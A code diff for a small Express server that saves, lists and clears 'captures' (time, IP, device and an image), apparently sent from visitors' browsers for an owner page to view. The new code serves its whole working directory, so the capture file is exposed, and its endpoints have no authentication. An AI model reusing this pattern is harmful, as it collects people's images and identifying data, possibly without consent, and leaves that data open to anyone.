@@ -1,46 +1,39 @@
 import express from "express";
-import bodyParser from "body-parser";
-import cors from "cors";
+import fs from "fs";
+import path from "path";
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const CAPTURE_FILE = path.join(process.cwd(), "captures.json");
 
-// Middleware
-app.use(bodyParser.json({ limit: "50mb" })); 
-app.use(cors());
-app.use(express.static("public")); 
-
-let captures = [];
+app.use(express.json({ limit: "20mb" })); // allow bigger images
+app.use(express.static(".")); // serve index.html + owner.html
 
 // Save capture
 app.post("/save-capture", (req, res) => {
-  const { time, ip, device, img } = req.body;
-
-  if (!time || !ip || !device || !img) {
-    return res.status(400).json({ error: "Missing fields" });
+  let logs = [];
+  if (fs.existsSync(CAPTURE_FILE)) {
+    logs = JSON.parse(fs.readFileSync(CAPTURE_FILE));
   }
-
-  const capture = { time, ip, device, img };
-  captures.push(capture);
-
-  console.log("📸 Capture saved:", capture.time);
-  res.json({ message: "Capture saved successfully" });
+  logs.push(req.body);
+  fs.writeFileSync(CAPTURE_FILE, JSON.stringify(logs, null, 2));
+  res.json({ success: true });
 });
 
+// Get captures
 app.get("/get-captures", (req, res) => {
-  res.json(captures);
+  if (fs.existsSync(CAPTURE_FILE)) {
+    const logs = JSON.parse(fs.readFileSync(CAPTURE_FILE));
+    res.json(logs);
+  } else {
+    res.json([]);
+  }
 });
 
-app.delete("/clear-captures", (req, res) => {
-  captures = [];
-  console.log("🗑️ All captures cleared.");
-  res.json({ message: "All captures cleared." });
+// Clear captures
+app.post("/clear-captures", (req, res) => {
+  fs.writeFileSync(CAPTURE_FILE, JSON.stringify([]));
+  res.json({ success: true });
 });
 
-app.get("/", (req, res) => {
-  res.sendFile("index.html", { root: "public" });
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
